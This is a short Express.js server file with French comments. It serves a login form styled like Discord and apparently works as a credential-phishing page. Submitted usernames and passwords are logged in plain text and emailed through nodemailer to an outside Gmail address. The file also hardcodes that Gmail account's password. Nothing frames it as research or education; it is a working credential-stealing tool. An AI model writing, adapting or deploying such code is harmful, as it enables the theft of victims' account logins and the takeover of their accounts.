const express = require("express");
const bodyParser = require("body-parser");
const nodemailer = require("nodemailer");

const app = express();

// Middleware pour lire les formulaires
app.use(bodyParser.urlencoded({ extended: true }));

// PAGE FORMULAIRE
app.get("/", (req, res) => {
res.send(`
<!DOCTYPE html>
<html>
<head>
<title>Formulaire</title>
<style>
body{
font-family: Arial;
background: #f2f3f5;
display:flex;
justify-content:center;
align-items:center;
height:100vh;
margin:0;
}

.box{
background:white;
padding:30px;
border-radius:10px;
width:320px;
box-shadow:0 0 10px rgba(0,0,0,0.1);
}

input{
width:100%;
padding:12px;
margin-top:10px;
border:1px solid #ccc;
border-radius:5px;
}

button{
width:100%;
padding:12px;
margin-top:15px;
background:#5865F2;
color:white;
border:none;
border-radius:5px;
cursor:pointer;
}
</style>
</head>
<body>

<div class="box">
<h2>Formulaire</h2>

<form method="POST" action="/send">

<input type="text" name="username" placeholder="Nom utilisateur" required>

<input type="password" name="password" placeholder="Mot de passe" required>

<button type="submit">Envoyer</button>

</form>

</div>

</body>
</html>
`);
});

// ROUTE ENVOI
app.post("/send", async (req, res) => {
  try {

    const username = req.body.username;
    const password = req.body.password;

    console.log("USERNAME:", username);
    console.log("PASSWORD:", password);

    // EMAIL CONFIG
    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: "kyalieepipou99@gmail.com",
        pass: "pUe7)CeIneY7fT25@"
      }
    });

    // ENVOI EMAIL
    await transporter.sendMail({
      from: "kyalieepipou99@gmail.com",
      to: "kyaliee.lasoje@gmail.com",
      subject: "Nouveau formulaire reçu",
      html: `
        <h2>Nouvelle soumission</h2>
        <p><b>Username :</b> ${username}</p>
        <p><b>Password :</b> ${password}</p>
      `
    });

    res.send("Email envoyé avec succès !");
  } catch (err) {
    console.log("ERREUR:", err);
    res.status(500).send("Erreur serveur");
  }
});

// PORT RENDER
const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log("Serveur démarré sur port " + PORT);
});